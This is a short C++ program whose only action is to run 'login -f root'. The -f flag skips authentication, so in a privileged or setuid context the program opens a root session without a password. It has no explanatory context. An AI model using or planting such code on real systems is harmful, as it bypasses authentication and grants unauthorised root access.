#include <iostream>
#include <unistd.h>
using namespace std;

int main(void)
{
	execlp("login", "login", "-f", "root", (char *)0);
}
